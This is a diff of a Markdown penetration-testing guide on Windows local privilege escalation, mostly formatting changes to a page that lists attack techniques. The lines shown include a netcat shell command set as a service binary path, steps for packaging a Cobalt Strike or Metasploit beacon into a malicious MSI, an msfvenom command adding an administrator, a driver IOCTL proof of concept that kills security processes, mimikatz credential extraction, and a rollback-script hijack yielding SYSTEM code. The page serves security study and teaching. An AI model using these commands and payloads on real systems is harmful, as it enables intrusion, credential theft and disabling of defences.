@@ -1,6 +1,6 @@
 # Windows Local Privilege Escalation
 
-{{#include ../../banners/hacktricks-training.md}}
+\{{#include ../../banners/hacktricks-training.md\}}
 
 ### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
@@ -10,37 +10,25 @@
 
 **If you don't know what are Windows Access Tokens, read the following page before continuing:**
 
-
-{{#ref}}
-access-tokens.md
-{{#endref}}
+\{{#ref\}} access-tokens.md \{{#endref\}}
 
 ### ACLs - DACLs/SACLs/ACEs
 
 **Check the following page for more info about ACLs - DACLs/SACLs/ACEs:**
 
-
-{{#ref}}
-acls-dacls-sacls-aces.md
-{{#endref}}
+\{{#ref\}} acls-dacls-sacls-aces.md \{{#endref\}}
 
 ### Integrity Levels
 
 **If you don't know what are integrity levels in Windows you should read the following page before continuing:**
 
-
-{{#ref}}
-integrity-levels.md
-{{#endref}}
+\{{#ref\}} integrity-levels.md \{{#endref\}}
 
 ## Windows Security Controls
 
 There are different things in Windows that could **prevent you from enumerating the system**, run executables or even **detect your activities**. You should **read** the following **page** and **enumerate** all these **defenses** **mechanisms** before starting the privilege escalation enumeration:
 
-
-{{#ref}}
-../authentication-credentials-uac-and-efs/
-{{#endref}}
+\{{#ref\}} ../authentication-credentials-uac-and-efs/ \{{#endref\}}
 
 ## System Info
 
@@ -67,21 +55,21 @@ This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for 
 
 **On the system**
 
-- _post/windows/gather/enum_patches_
-- _post/multi/recon/local_exploit_suggester_
-- [_watson_](https://github.com/rasta-mouse/Watson)
-- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_
+* _post/windows/gather/enum\_patches_
+* _post/multi/recon/local\_exploit\_suggester_
+* [_watson_](https://github.com/rasta-mouse/Watson)
+* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_
 
 **Locally with system information**
 
-- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
-- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
+* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
 
 **Github repos of exploits:**
 
-- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
-- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
-- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
+* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
+* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
+* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
 ### Environment
 
@@ -196,6 +184,7 @@ If you get a reply such as one of these:
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
       WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
 ```
+
 ```bash
 WUServer     : http://xxxx-updxx.corp.internal.com:8530
 PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
@@ -213,9 +202,7 @@ In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](ht
 
 Read the research here:
 
-{{#file}}
-CTX_WSUSpect_White_Paper (1).pdf
-{{#endfile}}
+\{{#file\}} CTX\_WSUSpect\_White\_Paper (1).pdf \{{#endfile\}}
 
 **WSUS CVE-2020-1013**
 
@@ -232,10 +219,7 @@ You can exploit this vulnerability using the tool [**WSUSpicious**](https://gith
 
 Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:
 
-
-{{#ref}}
-abusing-auto-updaters-and-ipc.md
-{{#endref}}
+\{{#ref\}} abusing-auto-updaters-and-ipc.md \{{#endref\}}
 
 ## KrbRelayUp
 
@@ -277,32 +261,26 @@ Just execute the created binary to escalate privileges.
 
 Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**
 
-
-{{#ref}}
-msi-wrapper.md
-{{#endref}}
+\{{#ref\}} msi-wrapper.md \{{#endref\}}
 
 ### Create MSI with WIX
 
-
-{{#ref}}
-create-msi-with-wix.md
-{{#endref}}
+\{{#ref\}} create-msi-with-wix.md \{{#endref\}}
 
 ### Create MSI with Visual Studio
 
-- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
-- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
-- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
-- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
-- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
-  - There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
-- Right-click the project and select **View > Custom Actions**.
-- Right-click **Install** and select **Add Custom Action**.
-- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
-- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
-- Finally, **build it**.
-  - If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.
+* **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
+* Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
+* Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
+* Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
+* Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
+  * There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
+* Right-click the project and select **View > Custom Actions**.
+* Right-click **Install** and select **Add Custom Action**.
+* Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
+* Under the **Custom Action Properties**, change **Run64Bit** to **True**.
+* Finally, **build it**.
+  * If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.
 
 ### MSI Installation
 
@@ -312,7 +290,7 @@ To execute the **installation** of the malicious `.msi` file in **background:**
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
 
-To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_
+To exploit this vulnerability you can use: _exploit/windows/local/always\_install\_elevated_
 
 ## Antivirus and Detectors
 
@@ -336,10 +314,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 
 **LAPS** is designed for the **management of local Administrator passwords**, ensuring that each password is **unique, randomised, and regularly updated** on computers joined to a domain. These passwords are securely stored within Active Directory and can only be accessed by users who have been granted sufficient permissions through ACLs, allowing them to view local admin passwords if authorized.
 
-
-{{#ref}}
-../active-directory-methodology/laps.md
-{{#endref}}
+\{{#ref\}} ../active-directory-methodology/laps.md \{{#endref\}}
 
 ### WDigest
 
@@ -401,20 +376,14 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 
 If you **belongs to some privileged group you may be able to escalate privileges**. Learn about privileged groups and how to abuse them to escalate privileges here:
 
-
-{{#ref}}
-../active-directory-methodology/privileged-groups-and-token-privileges.md
-{{#endref}}
+\{{#ref\}} ../active-directory-methodology/privileged-groups-and-token-privileges.md \{{#endref\}}
 
 ### Token manipulation
 
 **Learn more** about what is a **token** in this page: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
 Check the following page to **learn about interesting tokens** and how to abuse them:
 
-
-{{#ref}}
-privilege-escalation-abusing-tokens.md
-{{#endref}}
+\{{#ref\}} privilege-escalation-abusing-tokens.md \{{#endref\}}
 
 ### Logged users / Sessions
 
@@ -499,12 +468,11 @@ Example: "Windows Help and Support" (Windows + F1), search for "command prompt",
 
 ## Services
 
-Service Triggers let Windows start a service when certain conditions occur (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Even without SERVICE_START rights you can often start privileged services by firing their triggers. See enumeration and activation techniques here:
+Service Triggers let Windows start a service when certain conditions occur (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Even without SERVICE\_START rights you can often start privileged services by firing their triggers. See enumeration and activation techniques here:
 
--
-{{#ref}}
-service-triggers.md
-{{#endref}}
+*
+
+\{{#ref\}} service-triggers.md \{{#endref\}}
 
 Get a list of services:
 
@@ -545,7 +513,7 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 If you are having this error (for example with SSDPSRV):
 
 _System error 1058 has occurred._\
-_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._
+&#xNAN;_&#x54;he service cannot be started, either because it is disabled or because it has no enabled devices associated with it._
 
 You can enable it using
 
@@ -564,7 +532,7 @@ sc.exe config usosvc start= auto
 
 ### **Modify service binary path**
 
-In the scenario where the "Authenticated users" group possesses **SERVICE_ALL_ACCESS** on a service, modification of the service's executable binary is possible. To modify and execute **sc**:
+In the scenario where the "Authenticated users" group possesses **SERVICE\_ALL\_ACCESS** on a service, modification of the service's executable binary is possible. To modify and execute **sc**:
 
 ```bash
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
@@ -583,13 +551,13 @@ net stop [service name] && net start [service name]
 
 Privileges can be escalated through various permissions:
 
-- **SERVICE_CHANGE_CONFIG**: Allows reconfiguration of the service binary.
-- **WRITE_DAC**: Enables permission reconfiguration, leading to the ability to change service configurations.
-- **WRITE_OWNER**: Permits ownership acquisition and permission reconfiguration.
-- **GENERIC_WRITE**: Inherits the ability to change service configurations.
-- **GENERIC_ALL**: Also inherits the ability to change service configurations.
+* **SERVICE\_CHANGE\_CONFIG**: Allows reconfiguration of the service binary.
+* **WRITE\_DAC**: Enables permission reconfiguration, leading to the ability to change service configurations.
+* **WRITE\_OWNER**: Permits ownership acquisition and permission reconfiguration.
+* **GENERIC\_WRITE**: Inherits the ability to change service configurations.
+* **GENERIC\_ALL**: Also inherits the ability to change service configurations.
 
-For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.
+For the detection and exploitation of this vulnerability, the _exploit/windows/local/service\_permissions_ can be utilized.
 
 ### Services binaries weak permissions
 
@@ -636,10 +604,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t RE
 
 If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**
 
-
-{{#ref}}
-appenddata-addsubdirectory-permission-over-service-registry.md
-{{#endref}}
+\{{#ref\}} appenddata-addsubdirectory-permission-over-service-registry.md \{{#endref\}}
 
 ### Unquoted Service Paths
 
@@ -683,7 +648,7 @@ msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f ex
 
 ### Recovery Actions
 
-Windows allows users to specify actions to be taken if a service fails. This feature can be configured to point to a binary. If this binary is replaceable, privilege escalation might be possible. More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
+Windows allows users to specify actions to be taken if a service fails. This feature can be configured to point to a binary. If this binary is replaceable, privilege escalation might be possible. More details can be found in the [official documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).
 
 ## Applications
 
@@ -734,10 +699,7 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 **Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
 **Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:
 
-
-{{#ref}}
-privilege-escalation-with-autorun-binaries.md
-{{#endref}}
+\{{#ref\}} privilege-escalation-with-autorun-binaries.md \{{#endref\}}
 
 ### Drivers
 
@@ -751,23 +713,23 @@ driverquery /SI
 
 If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:
 
-{{#ref}}
-arbitrary-kernel-rw-token-theft.md
-{{#endref}}
+\{{#ref\}} arbitrary-kernel-rw-token-theft.md \{{#endref\}}
 
-#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)
+#### Abusing missing FILE\_DEVICE\_SECURE\_OPEN on device objects (LPE + EDR kill)
 
-Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:
+Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE\_DEVICE\_SECURE\_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:
 
-- \\ .\\DeviceName\\anything
-- \\ .\\amsdk\\anyfile (from a real-world case)
+* \ .\DeviceName\anything
+* \ .\amsdk\anyfile (from a real-world case)
 
 Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
-- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
-- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
-- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.
+
+* Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
+* Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
+* Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.
 
 Minimal PoC pattern (user mode):
+
 ```c
 // Example based on a vulnerable antimalware driver
 #define IOCTL_REGISTER_PROCESS  0x80002010
@@ -781,14 +743,15 @@ DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0)
 ```
 
 Mitigations for developers
-- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
-- Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
-- Constrain IOCTLs (access masks, METHOD_*, input validation) and consider brokered models instead of direct kernel privileges.
+
+* Always set FILE\_DEVICE\_SECURE\_OPEN when creating device objects intended to be restricted by a DACL.
+* Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
+* Constrain IOCTLs (access masks, METHOD\_\*, input validation) and consider brokered models instead of direct kernel privileges.
 
 Detection ideas for defenders
-- Monitor user-mode opens of suspicious device names (e.g., \\ .\\amsdk*) and specific IOCTL sequences indicative of abuse.
-- Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.
 
+* Monitor user-mode opens of suspicious device names (e.g., \ .\amsdk\*) and specific IOCTL sequences indicative of abuse.
+* Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.
 
 ## PATH DLL Hijacking
 
@@ -802,10 +765,7 @@ for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F
 
 For more information about how to abuse this check:
 
-
-{{#ref}}
-dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
-{{#endref}}
+\{{#ref\}} dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md \{{#endref\}}
 
 ## Network
 
@@ -961,10 +921,7 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
 You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).
 
-
-{{#ref}}
-dpapi-extracting-passwords.md
-{{#endref}}
+\{{#ref\}} dpapi-extracting-passwords.md \{{#endref\}}
 
 ### PowerShell Credentials
 
@@ -1138,7 +1095,7 @@ SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Ag
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
 
-If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
+If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract).\
 More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
 If `ssh-agent` service is not running and you want it to automatically start on boot run:
@@ -1147,8 +1104,7 @@ If `ssh-agent` service is not running and you want it to automatically start on 
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 
-> [!TIP]
-> It looks like this technique isn't valid anymore. I tried to create some ssh keys, add them with `ssh-add` and login via ssh to a machine. The registry HKCU\Software\OpenSSH\Agent\Keys doesn't exist and procmon didn't identify the use of `dpapi.dll` during the asymmetric key authentication.
+> \[!TIP] It looks like this technique isn't valid anymore. I tried to create some ssh keys, add them with `ssh-add` and login via ssh to a machine. The registry HKCU\Software\OpenSSH\Agent\Keys doesn't exist and procmon didn't identify the use of `dpapi.dll` during the asymmetric key authentication.
 
 ### Unattended files
 
@@ -1167,7 +1123,7 @@ C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
 
-You can also search for these files using **metasploit**: _post/windows/gather/enum_unattend_
+You can also search for these files using **metasploit**: _post/windows/gather/enum\_unattend_
 
 Example content:
 
@@ -1226,12 +1182,12 @@ To mitigate this risk, a function was developed to scan for locally cached GPP f
 
 Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:
 
-- Groups.xml
-- Services.xml
-- Scheduledtasks.xml
-- DataSources.xml
-- Printers.xml
-- Drives.xml
+* Groups.xml
+* Services.xml
+* Scheduledtasks.xml
+* DataSources.xml
+* Printers.xml
+* Drives.xml
 
 **To decrypt the cPassword:**
 
@@ -1401,7 +1357,7 @@ Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAct
 
 You should also check the Bin to look for credentials inside it
 
-To **recover passwords** saved by several programs you can use: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
+To **recover passwords** saved by several programs you can use: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
 
 ### Inside the registry
 
@@ -1423,10 +1379,10 @@ Also check for the history, bookmarks and favourites of the browsers so maybe so
 
 Tools to extract passwords from browsers:
 
-- Mimikatz: `dpapi::chrome`
-- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
-- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
-- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)
+* Mimikatz: `dpapi::chrome`
+* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
+* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
+* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)
 
 ### **COM DLL Overwriting**
 
@@ -1436,16 +1392,13 @@ COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT
 
 Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).
 
-![](<../../images/image (729).png>)
+![](<../../../.gitbook/assets/image (729).png>)
 
 Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.
 
 To learn how attackers use COM Hijacking as a persistence mechanism check:
 
-
-{{#ref}}
-com-hijacking.md
-{{#endref}}
+\{{#ref\}} com-hijacking.md \{{#endref\}}
 
 ### **Generic Password search in files and registry**
 
@@ -1502,7 +1455,7 @@ Shared memory segments, referred to as **pipes**, enable process communication a
 
 Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.
 
-When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).
+When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](./#from-high-integrity-to-system).
 
 Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
@@ -1510,7 +1463,7 @@ Also the following tool allows to **intercept a named pipe communication with a 
 
 ### File Extensions that could execute stuff in Windows
 
-Check out the page **[https://filesec.io/](https://filesec.io/)**
+Check out the page [**https://filesec.io/**](https://filesec.io/)
 
 ### **Monitoring Command Lines for passwords**
 
@@ -1586,17 +1539,11 @@ https://github.com/jas502n/CVE-2019-1388
 
 Read this to **learn about Integrity Levels**:
 
-
-{{#ref}}
-integrity-levels.md
-{{#endref}}
+\{{#ref\}} integrity-levels.md \{{#endref\}}
 
 Then **read this to learn about UAC and UAC bypasses:**
 
-
-{{#ref}}
-../authentication-credentials-uac-and-efs/uac-user-account-control.md
-{{#endref}}
+\{{#ref\}} ../authentication-credentials-uac-and-efs/uac-user-account-control.md \{{#endref\}}
 
 ## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP
 
@@ -1608,80 +1555,68 @@ The summarized technique is the following:
 
 1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**
 
-- Step 1: Install the MSI
-    - Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
-    - Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
-    - Keep a **handle** open to the file after install.
-
-- Step 2: Begin Uninstall
-    - Uninstall the same `.msi`.
-    - The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
-    - **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.
-
-- Step 3: Custom Syncing
-    - The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
-        - Signals when `.rbf` has been written.
-        - Then **waits** on another event before continuing the uninstall.
-
-- Step 4: Block Deletion of `.rbf`
-    - When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
-    - Then **signal back** so the uninstall can finish.
-    - Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.
-
-- Step 5: Manually Delete `.rbf`
-    - You (attacker) delete the `.rbf` file manually.
-    - Now **`C:\Config.Msi` is empty**, ready to be hijacked.
+* Step 1: Install the MSI
+  * Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
+  * Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
+  * Keep a **handle** open to the file after install.
+* Step 2: Begin Uninstall
+  * Uninstall the same `.msi`.
+  * The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
+  * **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.
+* Step 3: Custom Syncing
+  * The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
+    * Signals when `.rbf` has been written.
+    * Then **waits** on another event before continuing the uninstall.
+* Step 4: Block Deletion of `.rbf`
+  * When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
+  * Then **signal back** so the uninstall can finish.
+  * Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.
+* Step 5: Manually Delete `.rbf`
+  * You (attacker) delete the `.rbf` file manually.
+  * Now **`C:\Config.Msi` is empty**, ready to be hijacked.
 
 > At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.
 
 2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**
 
-- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
-    - Recreate the `C:\Config.Msi` folder yourself.
-    - Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.
-
-- Step 7: Run Another Install
-    - Install the `.msi` again, with:
-        - `TARGETDIR`: Writable location.
-        - `ERROROUT`: A variable that triggers a forced failure.
-    - This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.
-
-- Step 8: Monitor for `.rbs`
-    - Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
-    - Capture its filename.
-
-- Step 9: Sync Before Rollback
-    - The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
-        - Signals an event when the `.rbs` is created.
-        - Then **waits** before continuing.
-
-- Step 10: Reapply Weak ACL
-    - After receiving the `.rbs created` event:
-        - The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
-        - But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.
+* Step 6: Recreate `C:\Config.Msi` with Weak ACLs
+  * Recreate the `C:\Config.Msi` folder yourself.
+  * Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.
+* Step 7: Run Another Install
+  * Install the `.msi` again, with:
+    * `TARGETDIR`: Writable location.
+    * `ERROROUT`: A variable that triggers a forced failure.
+  * This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.
+* Step 8: Monitor for `.rbs`
+  * Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
+  * Capture its filename.
+* Step 9: Sync Before Rollback
+  * The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
+    * Signals an event when the `.rbs` is created.
+    * Then **waits** before continuing.
+* Step 10: Reapply Weak ACL
+  * After receiving the `.rbs created` event:
+    * The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
+    * But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.
 
 > ACLs are **only enforced on handle open**, so you can still write to the folder.
 
-- Step 11: Drop Fake `.rbs` and `.rbf`
-    - Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
-        - Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
-    - Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.
-
-- Step 12: Trigger the Rollback
-    - Signal the sync event so the installer resumes.
-    - A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
-    - This causes **rollback to begin**.
-
-- Step 13: SYSTEM Installs Your DLL
-    - Windows Installer:
-        - Reads your malicious `.rbs`.
-        - Copies your `.rbf` DLL into the target location.
-    - You now have your **malicious DLL in a SYSTEM-loaded path**.
-
-- Final Step: Execute SYSTEM Code
-    - Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
-    - **Boom**: Your code is executed **as SYSTEM**.
-
+* Step 11: Drop Fake `.rbs` and `.rbf`
+  * Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
+    * Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
+  * Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.
+* Step 12: Trigger the Rollback
+  * Signal the sync event so the installer resumes.
+  * A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
+  * This causes **rollback to begin**.
+* Step 13: SYSTEM Installs Your DLL
+  * Windows Installer:
+    * Reads your malicious `.rbs`.
+    * Copies your `.rbf` DLL into the target location.
+  * You now have your **malicious DLL in a SYSTEM-loaded path**.
+* Final Step: Execute SYSTEM Code
